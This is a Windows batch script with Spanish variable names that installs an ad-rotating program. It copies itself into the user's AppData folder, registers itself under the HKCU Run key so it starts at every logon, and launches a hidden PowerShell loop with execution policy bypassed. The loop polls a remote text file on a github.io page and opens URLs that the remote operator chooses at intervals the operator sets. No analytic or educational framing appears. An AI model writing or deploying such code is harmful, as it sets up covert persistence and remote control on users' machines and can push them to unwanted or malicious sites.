@echo off
setlocal
set "CARPETA_ADS=%LOCALAPPDATA%\ADS"
set "BAT_DESTINO=%CARPETA_ADS%\rotador_ads.bat"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=RotadorAdsPS"

if not exist "%CARPETA_ADS%" mkdir "%CARPETA_ADS%" >nul 2>&1
if /i not "%~f0"=="%BAT_DESTINO%" (
    if not exist "%BAT_DESTINO%" copy /y "%~f0" "%BAT_DESTINO%" >nul 2>&1
)

reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
if errorlevel 1 (
    reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "\"%BAT_DESTINO%\"" /f >nul
)

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while ($true) { $sleep = 3600; try { $r = Invoke-WebRequest -Uri 'https://browsergx.github.io/ads/ads.txt' -UseBasicParsing -TimeoutSec 15; $lines = ($r.Content -split \"`r?`n\") | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }; $activo = 1; foreach ($ln in $lines) { if ($ln -match '^activo\s*=\s*(.+)$') { $val = $matches[1].Trim(); if ($val -eq '0' -or $val -imatch '^false$') { $activo = 0 } else { $activo = 1 } } elseif ($ln -match '^interval\s*=\s*(\d+)$') { $parsed = [int]$matches[1]; if ($parsed -gt 0) { $sleep = $parsed } } }; if ($activo -eq 1) { $u = $lines | Where-Object { $_ -match '^https?://' } | ForEach-Object { ($_ -split '\|\|\|')[0].Trim() } | Where-Object { $_ -ne '' }; if ($u.Count -gt 0) { Start-Process -FilePath (Get-Random -InputObject $u) } } } catch {} ; Start-Sleep -Seconds $sleep } }"
exit /b
